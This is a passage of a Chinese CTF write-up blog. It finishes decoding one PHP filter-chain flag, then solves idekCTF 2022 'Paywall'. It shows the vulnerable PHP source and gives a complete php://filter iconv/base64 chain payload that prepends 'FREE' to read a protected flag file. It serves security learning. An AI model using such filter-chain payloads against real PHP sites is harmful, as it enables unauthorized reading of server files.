important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里就是一串filterchain，直接运行会报错，看一眼报错全是和base64-encode有关的，这里仔细一看发现附件给的base64-encode后面全加空格了（恼</p>
+<p>删掉那些空格，然后尝试运行</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231125151813147.png" alt="image-20231125151813147"></p>
+<p>返回了乱码，仔细想想应该是由于文件内容长度不是3的倍数导致的</p>
+<p>那么我们把过滤器里最后一个convert.base64-decode删掉，再次运行</p>
+<p>得到<code>NssssCTFeyAgphhpRmlsdGVyQ2hhMW5fW4sS0FunICB9GyQp</code></p>
+<p>对这个字符串4个4个分组</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">Nsss sCTF eyAg phhp Rmls dGVy Q2hh MW5f W4sS <span class="token number">0</span>Fun <span class="token constant">ICB9</span> GyQp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后挨组base64解码，保留解码后的有效字符</p>
+<p><code>eyAg</code>-&gt;<code>&#123;  </code></p>
+<p><code>RmlsdGVyQ2hhMW5f</code>-&gt;<code>FilterCha1n_</code></p>
+<p><code>ICB9</code>-&gt;<code>  &#125;</code></p>
+<p>最后的结果：<code>NssssCTF&#123;phhpFilterCha1n_W4sS0Fun&#125;</code></p>
+<p>不知道为什么提交上去flag是错的</p>
+<hr>
+<h1 id="idekCTF-2022-Paywall（实战运用）"><a href="#idekCTF-2022-Paywall（实战运用）" class="headerlink" title="[idekCTF 2022]Paywall（实战运用）"></a>[idekCTF 2022]Paywall（实战运用）</h1><p>源码地址：<a target="_blank" rel="noopener" href="https://ctf.idek.team/challs">https://ctf.idek.team/challs</a></p>
+<p>复现：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> paywall <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/24/FilterChain/image-20231126005124880.png" alt="image-20231126005124880"></p>
+<p>题目提供了几个跳转界面，其中flag就是在All about flags里，点击跳转回显<code>Thank you for your interest in The idek Times, but this article is only for premium users!</code></p>
+<p>这时候我们回来审一下核心的php源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">set_include_path</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'articles/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$article_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$article_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PREMIUM'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Thank you for your interest in The idek Times, but this article is only for premium users!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TODO: implement subscriptions</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$article_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'FREE'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;article><span class="token interpolation"><span class="token variable">$article_content</span></span>&lt;/article>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nothing here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+           
+    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>逻辑很简单，文件必须以<code>FREE</code>开头，不能以<code>PREMIUM</code>开头，访问flag时返回的是<code>Thank you for your interest in The idek Times, but this article is only for premium users!</code>说明flag是以<code>PREMIUM</code>开头的</p>
+<p>那么我们思路很明确，在<code>file_get_contents()</code> 函数从请求的flag文件中读取内容的时候，在读取到的flag文件内容开头加一个 <code>FREE</code> ，这样就能让php输出$article_content的内容</p>
+<p>要做到这点就要利用filterchain，把FREE拼在前面，这里需要注意<code>FREE</code>的BASE64编码为：<code>RlJFRQ==</code>，FREE是四个字节，不是3的倍数，因此会出现等号，而等会要用到的过滤器<code>convert.iconv.UTF8.UTF7</code>会消掉等号</p>
+<p><img src="/blog/2023/11/24/FilterChain/image-20231126010535384.png" alt="image-20231126010535384"></p>
+<p>（1文件的内容是<code>RlJFRQ==</code>）</p>
+<p>因此我们需要补齐要添加的字符串为3的倍数，这里也就是补两个字符，添加一个<code>FREEbb</code>到最前面即可</p>
+<p>这里用探姬的脚本来生成，修改一下我们的参数</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># set your parameter</span>
+file_to_use <span class="token operator">=</span> <span class="token string">"flag"</span>
+str_to_gerenate <span class="token operator">=</span> <span class="token string">"FREEbb"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>然后运行脚本生成我们的payload即可</p>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/24/FilterChain/image-20231126011758336.png" alt="image-20231126011758336"></p>
 
     </div>
     
